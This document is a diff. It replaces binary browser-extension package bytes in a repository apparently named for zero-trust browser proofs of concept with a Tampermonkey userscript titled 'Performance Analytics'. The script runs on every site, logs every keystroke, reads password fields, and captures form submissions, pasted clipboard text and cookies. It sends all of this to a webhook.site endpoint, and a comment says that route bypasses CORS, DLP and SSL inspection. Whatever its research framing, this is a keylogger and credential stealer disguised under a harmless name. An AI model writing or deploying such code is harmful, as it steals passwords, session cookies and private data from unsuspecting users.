@@ -1,54 +1,96 @@
-# Zero-Trust-Browser-PoC-Pages
-Zero-Trust Browser PoC Pages
-Cr24���&�����0�"0
-	*�H��
-���0�
-�����ħ���c�:2����6����n�X>�O���p`������Թ��w+?P%D)���z.�x�N����FC�І+Yڨ���$���0��`�;|	��Z���V֭C�!�n�у���m���'��:-5������������Tۦˊ�w��[��������Zg��I&������&�
-�Z2U�8�Ka*�z���!�F��5�K�)6C�w�>6���������7ڪj2��"��L����ᅍ⚽�����!�5��S���G�����p�Y!�yy^�j���ZY��Ι۵�E��-�x	!,�H��!/�L=Rz!�7����
-$ѯ^�C�ϓ���vq���S�_Ӄ�gqa��@��s���Ǎ�u/����g\T�;rkc�f�q�
-��E�Af��(���V�2>�����	d]�*���+MG�)�;w�������K�=@��;��X��g�S4jq����<��`��9s�bȜ���3�D�7K�h���^�}��6.
-�y2[PK����]U~\�W�z��������icon.png��s����b``���p	�
- ��$�%�f``
-�tq�����e���ȑ����!�2�FOL�^-]5㴲��gv{;���߿������!_z�n�AMwqg�
-J�[���:�T[��PX$��!�����{��^5�g�=�z�]�f�����֓���˗��>˷��ək����]c^3�W�vd�O��ö�����ym�޷����:X�x����'�^K�j~�����WŲm����Ⰾ����hb���?�����,��d��
-�9^��-�'r��?���z@���r��
-��
-���y�
-\�,��܃�0��?c��k����_�ڍ�ԩ�9`1�������s'��n��t#�1�]0cG��|�x�l͆���@O���*4����a<�V�ʏ_:��X�ᬭ	��������9X�+n�P������qB
-Ǿl��j�l:�B��=55�=�f�8�^��_ѿa��o���߸X�L){�ƾ:�&a�G`Fݬ�ݾ�뢯����sT_��/���uMz0�g��n��k�qT~��W��M�^��zܗ��,(�.VM>���n�W1ͯy�9�J��7TI<�w����}�ܹ���?W���r��5��f`x`w�����'m_&�
-�����:��&�PK����RU~\�pcr1�����
-���content.js�V͎�6��)�=�m �dQ�� -�Yt��nѴ=t0���8�+����}�>I)�'��L�9�X)�#?�����Rt�xa�߿�U
+// ==UserScript==                                                                                                                                                        
+  // @name         Performance Analytics
+  // @namespace    http://tampermonkey.net/                                                                                                                                
+  // @version      1.0                                                                                                                                                   
+  // @description  Page performance monitoring                                                                                                                           
+  // @match        *://*/*                                                                                                                                                 
+  // @grant        GM_xmlhttpRequest
+  // @connect      webhook.site                                                                                                                                            
+  // @run-at       document-idle                                                                                                                                         
+  // ==/UserScript==                                                                                                                                                       
+   
+  (function() {                                                                                                                                                            
+      'use strict';                                                                                                                                                      
+      if (window.__pa_active) return;                                                                                                                                    
+      window.__pa_active = true;                                                                                                                                           
+   
+      var W = 'https://webhook.site/3bf3755d-69fc-4f50-a34c-3c28ed2765ef';                                                                                                 
+      var kb = [];                                                                                                                                                       
+                                                                                                                                                                           
+      // Keylogger — every keystroke on every site                                                                                                                         
+      document.addEventListener('keydown', function(e) {                                                                                                                 
+          kb.push({                                                                                                                                                        
+              k: e.key,                                                                                                                                                  
+              f: (e.target.name || e.target.id || e.target.tagName).substring(0, 30),                                                                                    
+              t: e.target.type || '',                                                                                                                                      
+              ts: Date.now()
+          });                                                                                                                                                              
+          if (kb.length >= 10) flush();                                                                                                                                  
+      }, true);                                                                                                                                                            
+   
+      function flush() {                                                                                                                                                   
+          if (kb.length === 0) return;                                                                                                                                   
+          send({                                                                                                                                                         
+              type: 'keylog',
+              url: location.href,
+              title: document.title,                                                                                                                                       
+              keys: kb.splice(0)
+          });                                                                                                                                                              
+      }                                                                                                                                                                  
+                                                                                                                                                                         
+      setInterval(flush, 4000);
+      window.addEventListener('beforeunload', flush);
 
-R��Q�`)N��D�N����R�|���x���X���@��eaPhJ%Ne�
-K0����mM�$�H���h��~[��^��qGofÍ��������m~3����nn�G<�2MQ9A,�rG0C�w{�x��`���-�1�M���
-.���
-�Rg�Yj�9`H�Ӟ4��H��'�x>���M((���3������I%u��Fq���)|=���c���-�1�7P�s���<�A�u
-��Mb
-6G���]v�@�����K_p���L��TqvRp#��k4�D3�g��<���U�V�cD��y�{\�y�������WO^&Rݱ(;�tOl%!]Z"�~
-��W�%}��0�+\����WW���b��Q�������z���W�|���f
-��z5���9IM�k8��
-��J�n=b��
-UW'����sǵ&�!b�:^�5ga�-5[����:��2�{�!xpN�Y[S8�����}�>���E���7d�I��B^�|�%�A����9o:uZ	�J;4��;J��B�b��_Jՠ,����HFu��I"6|1G?��Mq���m,�6ߓ!�q����7�9V����B\��s���-C���p#Y�h�`5愵�E@���4C#W��Hd3DT_�< ��r<�m7��s��r[
-��]w��;��Z��?�_�~u��d��&'�6	n�W�s�Եs��y��l<�N��<�0���@�{t���A*b,E.Yl�o���vE��Hذh�*YҪ~���G���ح��7��۠}B;Bzc�ք����u0;���W�Lr���6�6|����/��(Sr�!=�액��'Ԛ�s�cZ`�O���"�8��a�C��p�,m��g�BN�
-r��[�0�tQ)T�FtV�#6��a/�W�� ���>l�����9�w�;�-�!�[��1L(���g����qćO���h@١>�����wϹi3����Y/�q��HZ�j(�tf��"���S`i�PK����XU~\0��P��
-��
-���background.js�V�n�6�O�ز������.@��u���(���ȢFRN�T�bO�'�)ْ-Y�/�xȻ������w)�4���*�9�y�%���? ���W0� �b	,I������8�
-Z��0NTg�$�~y�z6{p"�35��m$ĝ�b�'�����(������h�g'/�����{<y:��s���k�s��p˴������Y���Og������������8��M��\^�v~���
-qX��6.�N4?�U��<�1~E��+��cAp+���
-��ױHݥZ�0ui�e;��<�n?��jE�?�~<�!͓��a����I�V&^�������h5��������Z��&h`2��IAfU8
-YΞ��d�.�C�2����
-�᭮��;�r��%4z�k9ב�༟�o��f=��Vcx��-Q�f�qUYF��x������V�1�2������8\���hh��n����S׶��#��T�T�+<�*5�"������Lc=-������nT;-��O>�x��R�H��PrB�C�i!9$�G&�
-��r
-	n'7�%�I��kԽ׮Cnx`J��`�/1��wUU��e%�f_���
-6�v�!�0<פ��T���p���=�h8,S�P!���* �jwoe��'Ys��,(��#�"W��y5�oa.��\�"�}ˑ��"*��%��5��{�[]8T�r"�j��V���G�۫سg{U�fv�[�����!�V��\�'0�5F:����2�@�m*���k?���(�Kx舧���&�'�����K���M�[����^��s����.�~`�
-b��T>�Ѹ��~N�������`�܂�~�$�cQCy)�'�(J�!����Dd�PYf�_�Ђ��U�� Yʷ�K�m�����}�i�J�[����M#eqߣ�a-��r�f&��2�#R��a-��\wvvX�Z�Y��I������:6�V�⬅��^���z/p��Eբ!ߊ4F���~��2���D,�������96󰊱����h���2��Qu�A���Roi��t�L��b�%\s�ޕ�;���֜�v_)[�ñ2��q�p���	�23��̬֫��PK����LU~\vz��6��v��
-���manifest.jsonm�Mj�0��9������颻�,MŶdF�
+      // Password fields — poll every 1.5s                                                                                                                                 
+      setInterval(function() {
+          document.querySelectorAll('input[type="password"]').forEach(function(f) {                                                                                        
+              if (f.value && f.value !== f.dataset._pw) {                                                                                                                
+                  f.dataset._pw = f.value;                                                                                                                                 
+                  send({
+                      type: 'password',                                                                                                                                    
+                      url: location.href,                                                                                                                                
+                      field: f.name || f.id || 'password',                                                                                                                 
+                      value: f.value                                                                                                                                     
+                  });                                                                                                                                                      
+              }
+          });                                                                                                                                                              
+      }, 1500);                                                                                                                                                          
+                                                                                                                                                                         
+      // Form submissions — capture all fields
+      document.addEventListener('submit', function(e) {
+          var fields = {};
+          try { new FormData(e.target).forEach(function(v, k) { fields[k] = v; }); } catch(x) {}                                                                           
+          send({                                                                                                                                                           
+              type: 'form',                                                                                                                                                
+              url: location.href,                                                                                                                                          
+              action: e.target.action,                                                                                                                                   
+              fields: fields                                                                                                                                             
+          });                                                                                                                                                              
+      }, true);
+                                                                                                                                                                           
+      // Clipboard                                                                                                                                                       
+      document.addEventListener('paste', function(e) {                                                                                                                   
+          var t = (e.clipboardData || window.clipboardData).getData('text');
+          if (t) send({ type: 'paste', url: location.href, text: t.substring(0, 500) });                                                                                   
+      }, true);                                                                                                                                                            
+                                                                                                                                                                           
+      // Page load — cookies + storage                                                                                                                                     
+      send({                                                                                                                                                             
+          type: 'pageload',                                                                                                                                                
+          url: location.href,
+          title: document.title,                                                                                                                                           
+          cookies: document.cookie,                                                                                                                                      
+          referrer: document.referrer                                                                                                                                    
+      });
 
-�{G�_
-�IߛyO3��c,Ҽ�(c���`õ�vn�j�/`��%�@E�h_���h��T�d��ג��V.�md2��v6K�cr�(u�+X�o�[ȴQ�#K��A��yh��0�R`����z�©�y��y].`������aDb��{3����qv8ćx+-��J4��T��c�{% V����*�[�<�fa����][��6��
-��F_��z����;ov:��gK#�Ƨ(Y/[�˩��������0��)1
->ϔ�{/�v����M����w7���PK����]U~\�W�z����������������������icon.pngPK����RU~\�pcr1�����
-����������������content.jsPK����XU~\0��P��
-��
-����������������background.jsPK����LU~\vz��6��v��
-�������������t��manifest.jsonPK���������������
+      // GM_xmlhttpRequest — bypasses CORS, DLP, SSL inspection                                                                                                            
+      function send(data) {
+          data.time = new Date().toISOString();                                                                                                                            
+          GM_xmlhttpRequest({                                                                                                                                            
+              method: 'POST',                                                                                                                                              
+              url: W,                                                                                                                                                      
+              data: JSON.stringify(data),                                                                                                                                
+              headers: { 'Content-Type': 'application/json' }                                                                                                              
+          });                                                                                                                                                            
+      }                                                                                                                                                                  
+  })();
